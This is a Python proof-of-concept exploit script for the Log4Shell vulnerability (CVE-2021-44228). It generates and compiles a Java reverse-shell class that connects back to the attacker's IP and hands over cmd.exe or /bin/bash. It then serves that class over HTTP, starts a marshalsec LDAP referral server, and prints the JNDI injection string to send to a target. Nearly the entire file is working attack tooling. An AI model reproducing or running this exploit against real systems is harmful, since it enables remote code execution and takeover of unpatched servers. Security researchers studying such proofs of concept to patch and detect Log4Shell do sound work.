import argparse
import subprocess
import sys
import threading
from http.server import HTTPServer, SimpleHTTPRequestHandler

from colorama import Fore, init

init(autoreset=True)


def list_to_string(s):
    str1 = ""
    try:
        for ele in s:
            str1 += ele
            return str1
    except Exception:
        parser.print_help()
        sys.exit(1)


def check_arg_types(user_ip, web_port, lport):
    if not web_port.isnumeric():
        print(Fore.RED + "[-] webport must be numeric.")
        sys.exit(1)
    if not lport.isnumeric():
        print(Fore.RED + "[-] lport must be numeric.")
        sys.exit(1)


def payload(user_ip, web_port, l_port):
    check_arg_types(user_ip, web_port, l_port)
    gen_exploit = ("""
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Exploit {

  public Exploit() throws Exception {
    String host = "%s";
    int port = %s;
    String cmd = getSystemPlatformExec();
    Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
    Socket s = new Socket(host, port);
    InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
    OutputStream po = p.getOutputStream(), so = s.getOutputStream();
    while (!s.isClosed()) {
      while (pi.available()>0)
        so.write(pi.read());
      while (pe.available()>0)
        so.write(pe.read());
      while (si.available()>0)
        po.write(si.read());
      so.flush();
      po.flush();
      Thread.sleep(50);
      try {
        p.exitValue();
        break;
      } catch (Exception e) {
        e.printStackTrace();
      }
    };
    p.destroy();
    s.close();
  }
  
  public String getSystemPlatformExec() {
    String os = System.getProperty("os.name").toLowerCase();
    if (os.contains("win")){
      // Operating system is Windows based.
      return "cmd.exe";
    } else if (os.contains("osx")){
      // Operating system is Apple OSX based.
      return "/bin/bash";   // (not sure, don't have apple to test this).
    } else if (os.contains("nix") || os.contains("aix") || os.contains("nux")){
      // Operating system is based on Linux/Unix
      return "/bin/bash";
    }
    return "/bin/bash";
  }
}
    """) % (user_ip, l_port)

    # writing the exploit to Exploit.java file
    try:
        with open("Exploit.java", "w+") as exploit_file:
            exploit_file.write(str(gen_exploit))
        print(Fore.GREEN + '[+] Exploit java class created success')
    except Exception as e:
        print(Fore.RED + f'[-] Something went wrong {e.__str__()}')
    check_java_available()
    print(Fore.GREEN + '[+] Setting up the LDAP and web server.')
    print(Fore.GREEN + f"[+] Starting the Web server on port {webport} http://0.0.0.0:{webport}", end="\n\n")

    # create the LDAP server on new thread
    t1 = threading.Thread(target=create_ldap_server, args=(user_ip, web_port))
    t1.start()

    # start the web server
    httpd = HTTPServer(('0.0.0.0', int(web_port)), SimpleHTTPRequestHandler)
    httpd.serve_forever()

def check_java_available():
    java_version = subprocess.call(['./jdk1.8.0_20/bin/java', '-version'], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    if java_version != 0:
        print(Fore.RED + '[-] Java is not installed inside the repository!')
        sys.exit(1)


def create_ldap_server(user_ip, lport):
    send_me = "${jndi:ldap://%s:1389/a}" % user_ip
    print(Fore.GREEN + "[+] Send me: " + send_me, end="\n\n")

    subprocess.run(["./jdk1.8.0_20/bin/javac", "Exploit.java"])

    url = f"http://{user_ip}:{lport}/#Exploit"
    subprocess.run(["./jdk1.8.0_20/bin/java", "-cp",
                    "target/marshalsec-0.0.3-SNAPSHOT-all.jar", "marshalsec.jndi.LDAPRefServer", url])


def header():
    print(Fore.BLUE + """
[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/kozmer/log4j-shell-poc
""")


if __name__ == "__main__":
    header()
    try:
        parser = argparse.ArgumentParser(description='please enter the values ')

        parser.add_argument('--userip', metavar='userip', type=str,
                            nargs='+', help='Enter IP for LDAPRefServer & Shell')

        parser.add_argument('--webport', metavar='webport', type=str,
                            nargs='+', help='listener port for HTTP port')

        parser.add_argument('--lport', metavar='lport', type=str,
                            nargs='+', help='Netcat Port')

        args = parser.parse_args()

        # print(args.userip)

        payload(list_to_string(args.userip), list_to_string(args.webport), list_to_string(args.lport))

    except KeyboardInterrupt:
        print(Fore.RED + "[EXIT] User interrupted the program.")
        sys.exit(0)
